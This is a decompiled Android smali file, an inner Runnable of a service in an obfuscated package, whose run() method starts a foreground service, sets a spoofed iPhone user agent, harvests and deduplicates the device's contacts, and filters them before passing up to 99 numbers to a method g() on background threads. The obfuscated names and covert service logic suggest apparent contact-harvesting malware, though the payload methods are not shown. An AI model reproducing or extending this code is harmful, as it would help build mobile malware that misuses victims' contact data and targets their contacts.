.class public Lcom/jadhalno/goplotu/Act$a;
.super Ljava/lang/Object;
.source "Act.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/jadhalno/goplotu/Act;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public final synthetic a:Lcom/jadhalno/goplotu/Act;


# direct methods
.method public constructor <init>(Lcom/jadhalno/goplotu/Act;)V
    .locals 0
    .param p1, "this$0"    # Lcom/jadhalno/goplotu/Act;

    .line 100
    iput-object p1, p0, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 19

    move-object/from16 v1, p0

    .line 104
    const-wide/16 v2, 0xa

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 105
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-le v0, v2, :cond_0

    .line 106
    iget-object v0, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    invoke-static {v0}, Lcom/jadhalno/goplotu/Act;->a(Lcom/jadhalno/goplotu/Act;)V

    goto :goto_0

    .line 108
    :cond_0
    iget-object v0, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    new-instance v2, Landroid/app/Notification;

    invoke-direct {v2}, Landroid/app/Notification;-><init>()V

    const/4 v3, 0x1

    invoke-virtual {v0, v3, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 109
    :goto_0
    const-string v0, "sadva"

    const-string v2, "servistarted"

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 110
    iget-object v0, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    invoke-virtual {v0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "MyPref"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 111
    .local v0, "pref":Landroid/content/SharedPreferences;
    iget-object v2, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    const-string v3, "agent"

    const-string v4, "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/jadhalno/goplotu/Act;->j:Ljava/lang/String;

    .line 113
    iget-object v2, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    iget-object v3, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    invoke-virtual {v3}, Lcom/jadhalno/goplotu/Act;->b()Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/jadhalno/goplotu/Act;->a:Ljava/lang/String;

    .line 114
    new-instance v2, Lb/c/a/a;

    iget-object v3, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    invoke-virtual {v3}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Lb/c/a/a;-><init>(Landroid/content/Context;)V

    .line 115
    .local v2, "w":Lb/c/a/a;
    invoke-virtual {v2}, Lb/c/a/a;->a()[Ljava/lang/String;

    move-result-object v3

    .line 116
    .local v3, "bc":[Ljava/lang/String;
    const-wide/16 v4, 0x7d0

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 117
    new-instance v4, Ljava/util/HashSet;

    invoke-direct {v4}, Ljava/util/HashSet;-><init>()V

    .line 118
    .local v4, "set":Ljava/util/Set;, "Ljava/util/Set<Ljava/lang/String;>;"
    invoke-static {v4, v3}, Ljava/util/Collections;->addAll(Ljava/util/Collection;[Ljava/lang/Object;)Z

    .line 119
    invoke-interface {v4}, Ljava/util/Set;->size()I

    move-result v5

    new-array v5, v5, [Ljava/lang/String;

    invoke-interface {v4, v5}, Ljava/util/Set;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [Ljava/lang/String;

    .line 120
    .local v5, "contacts":[Ljava/lang/String;
    const/16 v6, 0x2710

    new-array v7, v6, [Ljava/lang/String;

    .line 121
    .local v7, "onlineck":[Ljava/lang/String;
    const/16 v8, 0xc8

    new-array v8, v8, [Ljava/lang/String;

    .line 122
    .local v8, "joinumber":[Ljava/lang/String;
    const/4 v9, 0x0

    .local v9, "aunlin":I
    const/4 v10, 0x0

    .line 123
    .local v10, "jnoc":I
    const/4 v11, 0x0

    .local v11, "i":I
    :goto_1
    array-length v12, v5

    const/16 v13, 0x63

    if-ge v11, v12, :cond_4

    .line 124
    aget-object v12, v5, v11

    if-eqz v12, :cond_1

    iget-object v12, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    aget-object v14, v5, v11

    invoke-virtual {v12, v14}, Lcom/jadhalno/goplotu/Act;->e(Ljava/lang/String;)Z

    move-result v12

    if-eqz v12, :cond_1

    .line 126
    aget-object v12, v5, v11

    aput-object v12, v8, v10

    .line 127
    add-int/lit8 v10, v10, 0x1

    goto :goto_2

    .line 128
    :cond_1
    aget-object v12, v5, v11

    if-eqz v12, :cond_2

    .line 129
    aget-object v12, v5, v11

    aput-object v12, v7, v9

    .line 130
    add-int/lit8 v9, v9, 0x1

    .line 132
    :cond_2
    :goto_2
    if-ne v10, v13, :cond_3

    .line 133
    goto :goto_3

    .line 123
    :cond_3
    add-int/lit8 v11, v11, 0x1

    goto :goto_1

    .line 136
    .end local v11    # "i":I
    :cond_4
    :goto_3
    move-object v11, v8

    .line 137
    .local v11, "tdjlc":[Ljava/lang/String;
    new-instance v12, Ljava/lang/Thread;

    new-instance v14, Lcom/jadhalno/goplotu/Act$a$a;

    invoke-direct {v14, v1, v11}, Lcom/jadhalno/goplotu/Act$a$a;-><init>(Lcom/jadhalno/goplotu/Act$a;[Ljava/lang/String;)V

    invoke-direct {v12, v14}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 152
    invoke-virtual {v12}, Ljava/lang/Thread;->start()V

    .line 154
    move v12, v10

    .line 156
    .local v12, "ttjio":I
    const/4 v14, 0x1

    .line 157
    .local v14, "send":Z
    new-array v6, v6, [Ljava/lang/String;

    .line 158
    .local v6, "remains":[Ljava/lang/String;
    const/4 v15, 0x0

    .local v15, "i":I
    const/16 v16, 0x0

    .local v16, "j":I
    :goto_4
    array-length v13, v7

    move-object/from16 v17, v0

    .end local v0    # "pref":Landroid/content/SharedPreferences;
    .local v17, "pref":Landroid/content/SharedPreferences;
    const/16 v0, 0xa

    if-ge v15, v13, :cond_8

    .line 160
    const/16 v13, 0x63

    if-ne v12, v13, :cond_5

    .line 161
    const/4 v14, 0x0

    .line 162
    move-object/from16 v18, v2

    goto :goto_6

    .line 164
    :cond_5
    aget-object v13, v7, v15

    if-eqz v13, :cond_6

    aget-object v13, v7, v15

    invoke-virtual {v13}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/String;->length()I

    move-result v13

    if-le v13, v0, :cond_6

    iget-object v0, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    aget-object v13, v7, v15

    invoke-virtual {v13}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v13

    move-object/from16 v18, v2

    .end local v2    # "w":Lb/c/a/a;
    .local v18, "w":Lb/c/a/a;
    const/4 v2, 0x2

    invoke-virtual {v13, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/jadhalno/goplotu/Act;->d(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 167
    aget-object v0, v7, v15

    aput-object v0, v8, v10

    .line 169
    iget-object v0, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    aget-object v2, v8, v10

    invoke-virtual {v0, v2}, Lcom/jadhalno/goplotu/Act;->g(Ljava/lang/String;)V

    .line 170
    add-int/lit8 v10, v10, 0x1

    .line 171
    add-int/lit8 v12, v12, 0x1

    goto :goto_5

    .line 164
    .end local v18    # "w":Lb/c/a/a;
    .restart local v2    # "w":Lb/c/a/a;
    :cond_6
    move-object/from16 v18, v2

    .line 174
    .end local v2    # "w":Lb/c/a/a;
    .restart local v18    # "w":Lb/c/a/a;
    :cond_7
    aget-object v0, v7, v15

    aput-object v0, v6, v16

    .line 175
    add-int/lit8 v16, v16, 0x1

    .line 158
    :goto_5
    add-int/lit8 v15, v15, 0x1

    move-object/from16 v0, v17

    move-object/from16 v2, v18

    const/16 v13, 0x63

    goto :goto_4

    .end local v18    # "w":Lb/c/a/a;
    .restart local v2    # "w":Lb/c/a/a;
    :cond_8
    move-object/from16 v18, v2

    .line 179
    .end local v2    # "w":Lb/c/a/a;
    .end local v15    # "i":I
    .end local v16    # "j":I
    .restart local v18    # "w":Lb/c/a/a;
    :goto_6
    if-eqz v14, :cond_b

    .line 180
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_7
    array-length v13, v6

    if-ge v2, v13, :cond_b

    .line 181
    const/16 v13, 0x63

    if-ne v12, v13, :cond_9

    .line 182
    goto :goto_8

    .line 184
    :cond_9
    aget-object v15, v7, v2

    if-eqz v15, :cond_a

    aget-object v15, v7, v2

    invoke-virtual {v15}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/String;->length()I

    move-result v15

    if-le v15, v0, :cond_a

    .line 185
    iget-object v15, v1, Lcom/jadhalno/goplotu/Act$a;->a:Lcom/jadhalno/goplotu/Act;

    aget-object v0, v8, v10

    invoke-virtual {v15, v0}, Lcom/jadhalno/goplotu/Act;->g(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 186
    add-int/lit8 v12, v12, 0x1

    .line 180
    :cond_a
    add-int/lit8 v2, v2, 0x1

    const/16 v0, 0xa

    goto :goto_7

    .line 193
    .end local v2    # "i":I
    .end local v3    # "bc":[Ljava/lang/String;
    .end local v4    # "set":Ljava/util/Set;, "Ljava/util/Set<Ljava/lang/String;>;"
    .end local v5    # "contacts":[Ljava/lang/String;
    .end local v6    # "remains":[Ljava/lang/String;
    .end local v7    # "onlineck":[Ljava/lang/String;
    .end local v8    # "joinumber":[Ljava/lang/String;
    .end local v9    # "aunlin":I
    .end local v10    # "jnoc":I
    .end local v11    # "tdjlc":[Ljava/lang/String;
    .end local v12    # "ttjio":I
    .end local v14    # "send":Z
    .end local v17    # "pref":Landroid/content/SharedPreferences;
    .end local v18    # "w":Lb/c/a/a;
    :cond_b
    :goto_8
    goto :goto_9

    .line 191
    :catch_0
    move-exception v0

    .line 192
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 194
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_9
    return-void
.end method
